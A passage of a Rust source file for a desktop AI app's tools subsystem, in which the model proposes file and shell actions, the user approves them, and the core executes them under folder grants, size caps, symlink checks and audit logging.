//! Tools subsystem (T8 / spec S7): model-proposes, user-approves, Rust-core-executes.
//!
//! Data flow (the security boundary lives HERE, not in the renderer):
//! 1. `tools_propose` validates and normalizes an action against the user's
//!    folder grants. Nothing is executed. A proposal (exact stored action,
//!    canonical paths) lives in the Rust core for TTL 5 minutes,
//!    single-use.
//! 2. The core decides HOW the proposal is approved ([`approval_route`],
//!    S13/S14): `auto` when every grant it touches is in `allow` mode,
//!    `inline` (an approval card in the chat stream, answered through
//!    `tools_approval_respond`) for `ask` mode, `native` (a dialog the
//!    renderer cannot fake) whenever a computer-wide grant is involved. The
//!    renderer only ever ANSWERS a pending request the core created
//!    ([`ApprovalBroker`]); it can never originate an approval.
//! 3. `execute` runs ONLY the exact stored action — paths are
//!    re-canonicalized and re-verified under the grant right before use,
//!    so symlink swaps or grant revocations between propose and execute
//!    fail closed. A declined approval discards the proposal.
//!
//! Caps (spec S7): read/write ≤ 2 MiB, list depth ≤ 3 / 500 entries,
//! command output ≤ 64 KiB, command timeout 30 s, binary files refused.
//! `run_command` is ON by default since round 2 (S15), switchable with
//! `tools_set_run_command_enabled`; it asks in `ask` mode and runs without
//! a prompt only when its cwd sits in an `allow`-mode grant.
//!
//! Destructive tools (S15): `move_path` (both ends inside granted scope,
//! symlink leaves refused, symlink components refused on the destination,
//! overwriting needs `overwrite: true`) and `delete_path` (to the OS trash
//! when one is reachable on the same volume, otherwise PERMANENT, which the
//! summary and approval text state explicitly). Grant roots, `$HOME`, the
//! app data dir and the sensitive deny-list can never be removed or moved
//! away, under any mode ([`grants::is_protected_removal_target`]).
//!
//! Audit: every propose/approve/deny/execute outcome is appended to
//! `tools-audit.log` (paths + summaries only — never file contents).

pub mod approvals;
pub mod audit;
pub mod diff;
pub mod grants;
pub mod save_skill;
pub mod trash;

use std::collections::HashMap;
use std::future::Future;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{Duration, Instant, SystemTime};

use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter, Manager};

use crate::profile;
pub use approvals::{ApprovalBroker, ApprovalRequest};
use audit::AuditEntry;
use grants::{ApprovalMode, GrantScope, GrantsStore};

// ---------------------------------------------------------------- caps --

/// Maximum bytes for one file read or write.
pub const MAX_FILE_BYTES: usize = 2 * 1024 * 1024;
/// Bytes sniffed for a NUL byte to detect binary files.
pub const BINARY_SNIFF_BYTES: usize = 8 * 1024;
/// Maximum entries returned by `list_files`.
pub const MAX_LIST_ENTRIES: usize = 500;

/// Directory-scan bound above the entry cap: read_dir stops reading here so
/// a huge flat folder can never be fully buffered (memory/time exhaustion
/// guard; the 500-entry output cap applies on top of this).
pub const MAX_LIST_SCAN: usize = MAX_LIST_ENTRIES + 256;
/// Maximum directory depth for `list_files` (relative to the root).
pub const MAX_LIST_DEPTH: usize = 3;
/// Maximum captured bytes per stream for `run_command`.
pub const MAX_OUTPUT_BYTES: usize = 64 * 1024;
/// Hard timeout for `run_command` (process is killed after this).
pub const COMMAND_TIMEOUT: Duration = Duration::from_secs(30);

/// Bounded wait for the pipe-drain reader threads after the process (group)
/// is gone. A grandchild that outlives the shell can hold the pipes open;
/// waiting forever on it would make `execute` never return (B3). After this
/// grace the reader thread is abandoned: the output collected so far is
/// returned, marked truncated. Residual: the abandoned thread keeps draining
/// until every writer closes the pipe (or dies of SIGPIPE when it exits).
pub const DRAIN_GRACE: Duration = Duration::from_secs(2);
/// How long a pending proposal stays valid.
pub const PROPOSAL_TTL: Duration = Duration::from_secs(300);

// --------------------------------------------------------------- types --

/// One tool action, exactly as the model proposed it (serde-tagged JSON).
/// Paths are ABSOLUTE; they are canonicalized and grant-checked before a
/// proposal is stored, and re-verified at execute time.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ToolAction {
    ReadFile {
        path: String,
    },
    ListFiles {
        path: String,
    },
    WriteFile {
        path: String,
        content: String,
    },
    ReplaceFile {
        path: String,
        old: String,
        new: String,
    },
    RunCommand {
        cmd: String,
        cwd_in_grant: String,
    },
    /// Move or rename a file/folder. Both ends must sit in granted scope.
    /// An existing destination is only replaced with `overwrite: true`
    /// (files only, never folders).
    MovePath {
        from: String,
        to: String,
        #[serde(default)]
        overwrite: bool,
    },
    /// Delete a file or folder: into the OS trash when reachable, otherwise
    /// permanently (stated in the summary and the approval text).
    DeletePath {
        path: String,
    },
    /// Copy an image the chat core generated (`source`, always directly
    /// under `app_data/images`) to `path` in granted scope: the
    /// `generate_image` tool's `save_path` (round 6). Same write rules as
    /// write_file (grant scope, deny-list, symlink walk, the grant's mode).
    /// NEVER deserialized: only the core builds it, from a file it just
    /// generated, so the renderer cannot name an arbitrary `source`.
    #[serde(skip_deserializing)]
    SaveImage {
        source: String,
        path: String,
    },
}

impl ToolAction {
    pub fn kind(&self) -> &'static str {
        match self {
            ToolAction::ReadFile { .. } => "read_file",
            ToolAction::ListFiles { .. } => "list_files",
            ToolAction::WriteFile { .. } => "write_file",
            ToolAction::ReplaceFile { .. } => "replace_file",
            ToolAction::RunCommand { .. } => "run_command",
            ToolAction::MovePath { .. } => "move_path",
            ToolAction::DeletePath { .. } => "delete_path",
            ToolAction::SaveImage { .. } => "save_image",
        }
    }
}

/// Structured rejection returned to the renderer as the IPC error value.
/// `kind` is stable (UI + tests match on it).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Rejection {
    pub kind: String,
    pub message: String,
}

impl Rejection {
    pub fn new(kind: &str, message: impl Into<String>) -> Self {
        Rejection {
            kind: kind.to_string(),
            message: message.into(),
        }
    }
}

fn io_rejection(what: &str, err: std::io::Error) -> Rejection {
    Rejection::new("io", format!("{what}: {err}"))
}

/// A validated, normalized action ready to be stored as a proposal.
#[derive(Debug, Clone)]
pub struct Validated {
    /// Normalized action: paths replaced by their canonical forms.
    pub action: ToolAction,
    /// One-line summary (paths + counts, never contents).
    pub summary: String,
    /// Unified diff for write/replace proposals.
    pub diff: Option<String>,
    pub grant_id: Option<String>,
    pub canonical_path: Option<PathBuf>,
    /// move_path only: the destination's grant and canonical path.
    pub dest_grant_id: Option<String>,
    pub dest_path: Option<PathBuf>,
    /// delete_path only: no trash is reachable, the delete is permanent.
    pub permanent_delete: bool,
}

impl Validated {
    /// A single-path validation (every action except move_path).
    fn single(
        action: ToolAction,
        summary: String,
        diff: Option<String>,
        grant_id: String,
        canonical: PathBuf,
    ) -> Self {
        Validated {
            action,
            summary,
            diff,
            grant_id: Some(grant_id),
            canonical_path: Some(canonical),
            dest_grant_id: None,
            dest_path: None,
            permanent_delete: false,
        }
    }
}

/// A pending proposal held in the Rust core. The renderer only ever sees
/// the approval request built from it; the stored action cannot be
/// modified from outside.
#[derive(Debug, Clone)]
pub struct PendingProposal {
    pub id: String,
    pub profile_id: String,
    pub conversation_id: Option<i64>,
    pub action: ToolAction,
    pub summary: String,
    pub diff: Option<String>,
    pub grant_id: Option<String>,
    pub canonical_path: Option<PathBuf>,
    pub dest_grant_id: Option<String>,
    pub dest_path: Option<PathBuf>,
    pub permanent_delete: bool,
    pub created_at: Instant,
}

/// Rust-core state: pending proposals keyed by id, plus the inline
/// approval requests waiting for the user's answer (S14).
pub struct ToolsState {
    inner: Mutex<HashMap<String, PendingProposal>>,
    /// TTL for proposals. Tests shrink this to assert expiry.
    pub ttl: Duration,
    /// Inline approval requests the renderer may answer (and nothing else).
    pub approvals: ApprovalBroker,
    /// Per-conversation folder selection (grant ids), set with every chat
    /// send. A conversation without an entry sees every grant (legacy).
    scopes: Mutex<HashMap<i64, Vec<String>>>,
    /// Random per-run id naming this run's session temp folders.
    session_id: String,
    /// Parent of the session temp folders (the OS temp dir in production;
    /// tests point it at a tempdir).
    pub scratch_base: PathBuf,
}

impl Default for ToolsState {
    fn default() -> Self {
        ToolsState {
            inner: Mutex::new(HashMap::new()),
            ttl: PROPOSAL_TTL,
            approvals: ApprovalBroker::default(),
            scopes: Mutex::new(HashMap::new()),
            session_id: uuid::Uuid::new_v4().to_string(),
            scratch_base: std::env::temp_dir(),
        }
    }
}

/// Id prefix of the synthetic session temp-folder grants (never stored in
/// `tools.json`; they exist only for the running app).
pub const SCRATCH_GRANT_PREFIX: &str = "session-tmp-";

impl ToolsState {
    /// Scope one conversation to the selected grant ids (`None` clears the
    /// scope: every grant of the profile applies, the pre-selection
    /// behavior).
    pub fn set_conversation_scope(&self, conversation_id: i64, grant_ids: Option<Vec<String>>) {
        let Ok(mut scopes) = self.scopes.lock() else {
            return;
        };
        match grant_ids {
            Some(ids) => {
                scopes.insert(conversation_id, ids);
            }
            None => {
                scopes.remove(&conversation_id);
            }
        }
    }

    /// The conversation's selected grant ids, when it has a scope.
    pub fn conversation_scope(&self, conversation_id: Option<i64>) -> Option<Vec<String>> {
        let conversation_id = conversation_id?;
        self.scopes.lock().ok()?.get(&conversation_id).cloned()
    }

    /// This run's temp folder for one conversation (not created here).
    pub fn scratch_dir(&self, conversation_id: i64) -> PathBuf {
        self.scratch_base
            .join("helmcode-desktop")
            .join(&self.session_id)
            .join(format!("conversation-{conversation_id}"))
    }
}

/// The synthetic grant over a conversation's session temp folder: ask mode
/// (it is not in `tools.json`, so [`approval_route`] always shows the
/// inline card), folder scope.
fn scratch_grant(profile_id: &str, conversation_id: i64, canonical: PathBuf) -> grants::Grant {
    grants::Grant {
        id: format!("{SCRATCH_GRANT_PREFIX}{conversation_id}"),
        canonical_path: canonical,
        granted_at: audit::timestamp_now_rfc3339(),
        profile_id: profile_id.to_string(),
        scope: GrantScope::Folder,
        mode: ApprovalMode::Ask,
    }
}

/// Create (owner-only on unix) and canonicalize a session temp folder.
fn ensure_scratch_dir(path: &Path) -> Result<PathBuf, Rejection> {
    std::fs::create_dir_all(path)
        .map_err(|err| io_rejection("cannot create the session temp folder", err))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))
            .map_err(|err| io_rejection("cannot protect the session temp folder", err))?;
    }
    std::fs::canonicalize(path)
        .map_err(|err| io_rejection("cannot resolve the session temp folder", err))
}

/// The grants one conversation may use (S-folder-picker):
/// - no conversation, or no scope set → the whole store (legacy);
/// - otherwise only the selected folder grants plus the computer-wide grant
///   ([`GrantsStore::scoped_to`]);
/// - NOTHING selected and no computer-wide grant → the session temp folder
///   is the only workspace (created on demand), so writes can still land
///   somewhere the user approves, never in their folders.
pub fn effective_store(
    store: &GrantsStore,
    state: &ToolsState,
    profile_id: &str,
    conversation_id: Option<i64>,
) -> Result<GrantsStore, Rejection> {
    let (Some(conversation_id), Some(selected)) =
        (conversation_id, state.conversation_scope(conversation_id))
    else {
        return Ok(store.clone());
    };
    let mut scoped = store.scoped_to(profile_id, &selected);
    if scoped.grants_for(profile_id).is_empty() {
        let canonical = ensure_scratch_dir(&state.scratch_dir(conversation_id))?;
        scoped
            .grants
            .push(scratch_grant(profile_id, conversation_id, canonical));
    }
    Ok(scoped)
}

/// `only_scratch`: replace the store's grants with the conversation's
/// session temp-folder grant ALONE (created on demand), so a fallback
/// proposal can only ever land in that folder, whatever else is granted.
/// Otherwise the store is returned unchanged.
fn with_session_scratch(
    mut store: GrantsStore,
    state: &ToolsState,
    profile_id: &str,
    conversation_id: Option<i64>,
    only_scratch: bool,
) -> Result<GrantsStore, Rejection> {
    if !only_scratch {
        return Ok(store);
    }
    let conversation_id = conversation_id
        .ok_or_else(|| Rejection::new("protocol", "a session temp folder needs a conversation"))?;
    let canonical = ensure_scratch_dir(&state.scratch_dir(conversation_id))?;
    store.grants = vec![scratch_grant(profile_id, conversation_id, canonical)];
    Ok(store)
}

/// The session temp-folder grant behind a stored proposal, when it targets
/// one (resolved from the running state, never from `tools.json`).
fn session_grants(state: &ToolsState, proposal: &PendingProposal) -> Vec<grants::Grant> {
    let Some(conversation_id) = proposal.conversation_id else {
        return Vec::new();
    };
    let id = format!("{SCRATCH_GRANT_PREFIX}{conversation_id}");
    let touches = proposal.grant_id.as_deref() == Some(id.as_str())
        || proposal.dest_grant_id.as_deref() == Some(id.as_str());
    if !touches {
        return Vec::new();
    }
    match std::fs::canonicalize(state.scratch_dir(conversation_id)) {
        Ok(canonical) => vec![scratch_grant(
            &proposal.profile_id,
            conversation_id,
            canonical,
        )],
        Err(_) => Vec::new(),
    }
}

/// Result of an executed proposal. Only the approved action's OWN output
/// is returned (read content, list entries, command output).
#[derive(Debug, Clone, Serialize, Default)]
pub struct ToolOutcome {
    pub action: String,
    pub summary: String,
    pub content: Option<String>,
    pub entries: Option<Vec<String>>,
    pub bytes_written: Option<u64>,
    pub stdout: Option<String>,
    pub stderr: Option<String>,
    pub exit_code: Option<i32>,
    pub timed_out: bool,
    /// Absolute paths of the regular files this action created or changed
    /// (inside the grant). The chat shows them as preview chips and the
    /// model is told where its work landed.
    pub produced: Vec<String>,
}

/// `tools_settings_get` view.
#[derive(Debug, Clone, Serialize)]
pub struct ToolsSettingsView {
    pub tools_allow_run_command: bool,
}

// -------------------------------------------------------- output roles --
//
// Round 17: the tool that PRODUCES a file declares what it is for the turn,
// so the preview pane opens the file the user asked for instead of guessing
// from names. A command that renders a document (html -> PDF, a docx/xlsx
// generator) declares that document the DELIVERABLE; everything else a
// command leaves behind (page and cover rasterisations, downloaded fonts,
// screenshots, helper output) is a BYPRODUCT. A moved/renamed document stays
// the deliverable. Generated images are declared by the chat core (the
// generate_image tool). Files the model writes itself (write_file,
// replace_file) are NOT declared: they are byproducts unless the final
// message names them, which the renderer already checks.

/// What a produced file is for the turn.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum OutputRole {
    Deliverable,
    Byproduct,
}

/// The kind of a declared deliverable.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum DeliverableKind {
    Document,
    Image,
}

/// One produced file with its declared role (`kind` only for deliverables).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct DeclaredOutput {
    pub path: String,
    pub role: OutputRole,
    pub kind: Option<DeliverableKind>,
}

impl DeclaredOutput {
    pub fn deliverable(path: impl Into<String>, kind: DeliverableKind) -> Self {
        Self {
            path: path.into(),
            role: OutputRole::Deliverable,
            kind: Some(kind),
        }
    }

    pub fn byproduct(path: impl Into<String>) -> Self {
        Self {
            path: path.into(),
            role: OutputRole::Byproduct,
            kind: None,
        }
    }
}

/// Final-document formats: what a render/convert step exists to produce.
const DOCUMENT_EXTENSIONS: &[&str] = &[
    "pdf", "docx", "doc", "odt", "rtf", "pptx", "ppt", "odp", "key", "xlsx", "xls", "ods", "epub",
    "pages", "numbers",
];

/// Whether `path` is a final-document format (case-insensitive extension).
pub fn is_document_path(path: &str) -> bool {
    Path::new(path)
        .extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| {
            DOCUMENT_EXTENSIONS
                .iter()
                .any(|known| known.eq_ignore_ascii_case(ext))
        })
}

/// The roles the tool `action_kind` (`ToolAction::kind`) declares for the
/// files it produced. See the section comment for the contract.
pub fn declare_outputs(action_kind: &str, produced: &[String]) -> Vec<DeclaredOutput> {
    match action_kind {
        "run_command" => produced
            .iter()
            .map(|path| {
                if is_document_path(path) {
                    DeclaredOutput::deliverable(path.clone(), DeliverableKind::Document)
                } else {
                    DeclaredOutput::byproduct(path.clone())
                }
            })
            .collect(),
        "move_path" => produced
            .iter()
            .filter(|path| is_document_path(path))
            .map(|path| DeclaredOutput::deliverable(path.clone(), DeliverableKind::Document))
            .collect(),
        _ => Vec::new(),
    }
}

// --------------------------------------------------------------- utils --

fn data_dir(app: &AppHandle) -> Result<PathBuf, String> {
    app.path().app_data_dir().map_err(|err| err.to_string())
}

fn load_store(dir: &Path) -> Result<GrantsStore, Rejection> {
    grants::load_or_seed(dir).map_err(|err| Rejection::new("io", err))
}

fn audit_event(dir: &Path, entry: AuditEntry) -> Result<(), Rejection> {
    audit::append(dir, &entry)
        .map_err(|err| Rejection::new("io", format!("cannot write audit log: {err}")))
}

fn prune_expired(map: &mut HashMap<String, PendingProposal>, ttl: Duration) {
    map.retain(|_, proposal| proposal.created_at.elapsed() <= ttl);
}

// -------------------------------------------------------------- propose --

/// Parse the renderer-supplied action JSON into a `ToolAction`.
/// Unknown kinds and malformed JSON are rejected with kind `unknown_action`.
pub fn parse_action(action_json: &str) -> Result<ToolAction, Rejection> {
    serde_json::from_str(action_json)
        .map_err(|err| Rejection::new("unknown_action", format!("unrecognized tool action: {err}")))
}

/// Diff helper for write proposals: returns (diff, note) comparing the
/// proposed content with the current file when it is readable text.
fn diff_against_current(
    canonical: &Path,
    content: &str,
) -> Result<(Option<String>, String), Rejection> {
    let meta = match std::fs::metadata(canonical) {
        Ok(meta) => meta,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
            // New file: the diff is a pure addition.
            let diff_text = diff::unified_diff(&canonical.display().to_string(), "", content);
            return Ok((Some(diff_text), String::new()));
        }
        Err(err) => return Err(io_rejection("cannot stat write target", err)),
    };
    if !meta.is_file() {
        return Err(Rejection::new(
            "protocol",
            "write target exists and is not a regular file",
        ));
    }
    if meta.len() as usize > MAX_FILE_BYTES {
        // Overwriting is still legitimate; there is just no old content to
        // diff against within the cap.
        return Ok((None, " (existing file over cap, no diff)".to_string()));
    }
    let bytes =
        std::fs::read(canonical).map_err(|err| io_rejection("cannot read write target", err))?;
    if is_binary(&bytes) {
        return Ok((None, " (overwrite binary file, no diff)".to_string()));
    }
    match String::from_utf8(bytes) {
        Ok(old) => {
            let diff_text = diff::unified_diff(&canonical.display().to_string(), &old, content);
            Ok((Some(diff_text), String::new()))
        }
        Err(_) => Ok((None, " (overwrite non-UTF-8 file, no diff)".to_string())),
    }
}

/// Validate and normalize an action against the grants store. This NEVER
/// executes anything: read_file/list_files only resolve paths, write/replace
/// read the CURRENT file solely to render the proposal diff, run_command
/// only checks the flag and cwd grant.
pub fn validate_action(
    store: &GrantsStore,
    profile_id: &str,
    action: &ToolAction,
) -> Result<Validated, Rejection> {
    match action {
        ToolAction::ReadFile { path } => {
            let (grant_id, canonical) = grants::resolve_under_grant(store, profile_id, path)?;
            Ok(Validated::single(
                ToolAction::ReadFile {
                    path: canonical.display().to_string(),
                },
                format!("read_file {}", canonical.display()),
                None,
                grant_id,
                canonical,
            ))
        }
        ToolAction::ListFiles { path } => {
            let (grant_id, canonical) = grants::resolve_under_grant(store, profile_id, path)?;
            Ok(Validated::single(
                ToolAction::ListFiles {
                    path: canonical.display().to_string(),
                },
                format!("list_files {}", canonical.display()),
                None,
                grant_id,
                canonical,
            ))
        }
        ToolAction::WriteFile { path, content } => {
            if content.len() > MAX_FILE_BYTES {
                return Err(Rejection::new(
                    "too_large",
                    format!(
                        "content is {} bytes; cap is {MAX_FILE_BYTES}",
                        content.len()
                    ),
                ));
            }
            let (grant_id, canonical) = grants::resolve_under_grant(store, profile_id, path)?;
            let (diff_text, note) = diff_against_current(&canonical, content)?;
            let (added, removed) = diff_text
                .as_deref()
                .map(diff::diff_line_counts)
                .unwrap_or((0, 0));
            let summary = format!(
                "write_file {} (+{added} −{removed} lines, {} bytes){note}",
                canonical.display(),
                content.len()
            );
            Ok(Validated::single(
                ToolAction::WriteFile {
                    path: canonical.display().to_string(),
                    content: content.clone(),
                },
                summary,
                diff_text,
                grant_id,
                canonical,
            ))
        }
        ToolAction::ReplaceFile { path, old, new } => {
            if old.is_empty() {
                return Err(Rejection::new("protocol", "old text must not be empty"));
            }
            let (grant_id, canonical) = grants::resolve_under_grant(store, profile_id, path)?;
            // Read the current file only to validate uniqueness and render
            // the proposal diff. Uniqueness is re-checked at execute time.
            let current = read_capped_text(&canonical)?;
            let matches = current.matches(old.as_str()).count();
            if matches == 0 {
                return Err(Rejection::new("not_found", "old text not found in file"));
            }
            if matches > 1 {
                return Err(Rejection::new(
                    "ambiguous",
                    format!("old text matches {matches} times, not unique"),
                ));
            }
            let updated_len = current.len() - old.len() + new.len();
            if updated_len > MAX_FILE_BYTES {
                return Err(Rejection::new(
                    "too_large",
                    "resulting file would exceed the 2 MiB cap",
                ));
            }
            let updated = current.replacen(old.as_str(), new.as_str(), 1);
            let diff_text =
                diff::unified_diff(&canonical.display().to_string(), &current, &updated);
            let (added, removed) = diff::diff_line_counts(&diff_text);
            let summary = format!(
                "replace_file {} (+{added} −{removed} lines)",
                canonical.display()
            );
            Ok(Validated::single(
                ToolAction::ReplaceFile {
                    path: canonical.display().to_string(),
                    old: old.clone(),
                    new: new.clone(),
                },
                summary,
                Some(diff_text),
                grant_id,
                canonical,
            ))
        }
        ToolAction::RunCommand { cmd, cwd_in_grant } => {
            if !store.tools_allow_run_command {
                return Err(Rejection::new(
                    "disabled",
                    "run_command is disabled; the user can enable it in Settings",
                ));
            }
            if cmd.trim().is_empty() {
                return Err(Rejection::new("protocol", "command must not be empty"));
            }
            let (grant_id, canonical) =
                grants::resolve_under_grant(store, profile_id, cwd_in_grant)?;
            Ok(Validated::single(
                ToolAction::RunCommand {
                    cmd: cmd.clone(),
                    cwd_in_grant: canonical.display().to_string(),
                },
                format!(
                    "run_command \"{cmd}\" in {}{}",
                    canonical.display(),
                    // Shown on the approval card: execute creates it.
                    if std::fs::symlink_metadata(&canonical).is_ok() {
                        ""
                    } else {
                        " (new folder, created first)"
                    }
                ),
                None,
                grant_id,
                canonical,
            ))
        }
        ToolAction::MovePath {
            from,
            to,
            overwrite,
        } => validate_move(store, profile_id, from, to, *overwrite),
        ToolAction::DeletePath { path } => validate_delete(store, profile_id, path),
        ToolAction::SaveImage { source, path } => {
            validate_save_image(store, profile_id, source, path)
        }
    }
}

/// `save_image`: `path` is an image file or an existing folder (the image
/// keeps its generated file name). The destination always carries the
/// generated image's OWN format (`.jpg` for a JPEG from FLUX, `.png`
/// otherwise; the bytes are copied as they are): an extension-less name gets
/// it, and an image extension of the other format (`.png` asked for a JPEG,
/// or `.jpg`/`.jpeg` for a PNG) is switched to it. Any other extension is
/// refused. The destination folder must exist; an existing regular file is
/// replaced (stated in the summary and on the approval card, like
/// write_file). The source is verified against the app's images folder by
/// [`check_protected_paths`], which knows the app data dir.
fn validate_save_image(
    store: &GrantsStore,
    profile_id: &str,
    source: &str,
    path: &str,
) -> Result<Validated, Rejection> {
    let (grant_id, mut canonical) = grants::resolve_under_grant(store, profile_id, path)?;
    if canonical.is_dir() {
        let name = Path::new(source)
            .file_name()
            .ok_or_else(|| Rejection::new("protocol", "the generated image has no file name"))?;
        canonical = canonical.join(name);
    }
    let source_is_jpeg = Path::new(source)
        .extension()
        .is_some_and(|ext| ext.eq_ignore_ascii_case("jpg"));
    let ext = canonical
        .extension()
        .map(|ext| ext.to_string_lossy().to_ascii_lowercase());
    match (ext.as_deref(), source_is_jpeg) {
        (Some("png"), false) | (Some("jpg" | "jpeg"), true) => {}
        (None | Some("png" | "jpg" | "jpeg"), _) => {
            canonical.set_extension(if source_is_jpeg { "jpg" } else { "png" });
        }
        (Some(_), _) => {
            return Err(Rejection::new(
                "protocol",
                "save_path must be an image file (.png or .jpg) or a folder",
            ));
        }
    }
    if !canonical.parent().is_some_and(|parent| parent.is_dir()) {
        return Err(Rejection::new(
            "not_found",
            "the destination folder does not exist",
        ));
    }
    let replaces = match std::fs::symlink_metadata(&canonical) {
        Ok(meta) if meta.file_type().is_file() => true,
        Ok(_) => {
            return Err(Rejection::new(
                "protocol",
                "the destination exists and is not a regular file",
            ));
        }
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => false,
        Err(err) => return Err(io_rejection("cannot stat destination", err)),
    };
    let bytes = std::fs::metadata(source)
        .map(|meta| meta.len())
        .unwrap_or(0);
    let summary = format!(
        "save_image {} ({bytes} bytes PNG){}",
        canonical.display(),
        if replaces {
            " (replaces the existing file)"
        } else {
            ""
        }
    );
    Ok(Validated::single(
        ToolAction::SaveImage {
            source: source.to_string(),
            path: canonical.display().to_string(),
        },
        summary,
        None,
        grant_id,
        canonical,
    ))
}

/// Refuse a raw (model-supplied) path whose LEAF is a symlink: deleting or
/// moving it would act on the link target that canonicalization resolved
/// to, not on the link the model named. Call after `resolve_under_grant`
/// (which already rejected relative and `..` paths).
fn reject_symlink_leaf(raw: &str) -> Result<(), Rejection> {
    match std::fs::symlink_metadata(Path::new(raw.trim())) {
        Ok(meta) if meta.file_type().is_symlink() => Err(Rejection::new(
            "symlink",
            format!(
                "{} is a symbolic link; refusing to move or delete it",
                raw.trim()
            ),
        )),
        _ => Ok(()),
    }
}

/// Existing entry at `canonical`, or a `not_found` rejection.
fn existing_meta(canonical: &Path) -> Result<std::fs::Metadata, Rejection> {
    std::fs::symlink_metadata(canonical).map_err(|err| {
        if err.kind() == std::io::ErrorKind::NotFound {
            Rejection::new(
                "not_found",
                format!("{} does not exist", canonical.display()),
            )
        } else {
            io_rejection("cannot stat path", err)
        }
    })
}

fn validate_move(
    store: &GrantsStore,
    profile_id: &str,
    from: &str,
    to: &str,
    overwrite: bool,
) -> Result<Validated, Rejection> {
    let (grant_id, source) = grants::resolve_under_grant(store, profile_id, from)?;
    reject_symlink_leaf(from)?;
    let source_meta = existing_meta(&source)?;
    let (dest_grant_id, dest) = grants::resolve_under_grant(store, profile_id, to)?;
    reject_symlink_leaf(to)?;
    if dest == source {
        return Err(Rejection::new(
            "protocol",
            "source and destination are the same path",
        ));
    }
    if grants::is_under(&source, &dest) {
        return Err(Rejection::new(
            "protocol",
            "cannot move a folder inside itself",
        ));
    }
    if !dest.parent().is_some_and(|parent| parent.is_dir()) {
        return Err(Rejection::new(
            "not_found",
            "the destination folder does not exist",
        ));
    }
    let replaces = match std::fs::symlink_metadata(&dest) {
        Ok(meta) => {
            if !overwrite {
                return Err(Rejection::new(
                    "exists",
                    format!(
                        "{} already exists; pass overwrite: true to replace it",
                        dest.display()
                    ),
                ));
            }
            if meta.is_dir() || source_meta.is_dir() {
                return Err(Rejection::new(
                    "protocol",
                    "only a file can replace an existing file; folders are never overwritten",
                ));
            }
            true
        }
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => false,
        Err(err) => return Err(io_rejection("cannot stat destination", err)),
    };
    let summary = format!(
        "move_path {} to {}{}",
        source.display(),
        dest.display(),
        if replaces {
            " (replaces the existing file)"
        } else {
            ""
        }
    );
    Ok(Validated {
        action: ToolAction::MovePath {
            from: source.display().to_string(),
            to: dest.display().to_string(),
            overwrite,
        },
        summary,
        diff: None,
        grant_id: Some(grant_id),
        canonical_path: Some(source),
        dest_grant_id: Some(dest_grant_id),
        dest_path: Some(dest),
        permanent_delete: false,
    })
}

/// Bounded recursive entry count for a delete summary (never follows
/// symlinks; stops at `MAX_LIST_SCAN`).
fn count_entries_bounded(dir: &Path, budget: &mut usize) -> usize {
    let Ok(read) = std::fs::read_dir(dir) else {
        return 0;
    };
    let mut count = 0;
    for entry in read.flatten() {
        if *budget == 0 {
            break;
        }
        *budget -= 1;
        count += 1;
        let is_real_dir = entry
            .file_type()
            .is_ok_and(|kind| kind.is_dir() && !kind.is_symlink());
        if is_real_dir {
            count += count_entries_bounded(&entry.path(), budget);
        }
    }
    count
}

fn validate_delete(
    store: &GrantsStore,
    profile_id: &str,
    path: &str,
) -> Result<Validated, Rejection> {
    let (grant_id, canonical) = grants::resolve_under_grant(store, profile_id, path)?;
    reject_symlink_leaf(path)?;
    let meta = existing_meta(&canonical)?;
    let what = if meta.is_dir() {
        let mut budget = MAX_LIST_SCAN;
        let count = count_entries_bounded(&canonical, &mut budget);
        let more = if budget == 0 { "+" } else { "" };
        format!("folder with {count}{more} entries")
    } else {
        format!("file, {} bytes", meta.len())
    };
    let permanent = !trash::available_for(trash::trash_home().as_deref(), &canonical);
    let fate = if permanent {
        "PERMANENT, no trash available on this volume"
    } else {
        "moved to the trash"
    };
    let mut validated = Validated::single(
        ToolAction::DeletePath {
            path: canonical.display().to_string(),
        },
        format!("delete_path {} ({what}; {fate})", canonical.display()),
        None,
        grant_id,
        canonical,
    );
    validated.permanent_delete = permanent;
    Ok(validated)
}

/// Audit a propose-time rejection: escape attempts are the most valuable
/// security signal and must leave a trace (paths + summary only, never
/// contents). Fail-closed: if the audit write itself fails, that error wins.
fn audit_rejection(
    dir: &Path,
    action: &ToolAction,
    profile_id: &str,
    rejection: &Rejection,
) -> Result<(), Rejection> {
    audit_event(
        dir,
        AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "propose".into(),
            action: action.kind().into(),
            outcome: "rejected".into(),
            grant_id: None,
            profile_id: Some(profile_id.to_string()),
            detail: Some(format!("{}: {}", rejection.kind, rejection.message)),
        },
    )
}

/// The app data dir (`dir`) is never a valid target, whatever the grant:
/// a computer-wide grant is rooted at `$HOME`, which contains it.
fn reject_protected(
    dir: &Path,
    store: &GrantsStore,
    validated: Validated,
) -> Result<Validated, Rejection> {
    check_protected_paths(
        dir,
        store,
        &validated.action,
        validated.canonical_path.as_deref(),
        validated.dest_path.as_deref(),
    )?;
    Ok(validated)
}

/// The always-refused checks shared by propose AND execute, independent of
/// grant mode and user approval: the app data dir, the sensitive write
/// deny-list (for every mutating action, both ends of a move) and the
/// protected removal targets (delete, and the source of a move).
fn check_protected_paths(
    dir: &Path,
    store: &GrantsStore,
    action: &ToolAction,
    canonical: Option<&Path>,
    dest: Option<&Path>,
) -> Result<(), Rejection> {
    if let ToolAction::SaveImage { source, .. } = action {
        crate::images::verify_generated_image(dir, Path::new(source))
            .map_err(|message| Rejection::new("scope", message))?;
    }
    for path in canonical.into_iter().chain(dest) {
        if grants::is_protected(dir, path) {
            return Err(Rejection::new(
                "scope",
                "the app's own data folder is off limits to tool actions",
            ));
        }
        reject_sensitive_write(action, path)?;
    }
    if matches!(
        action,
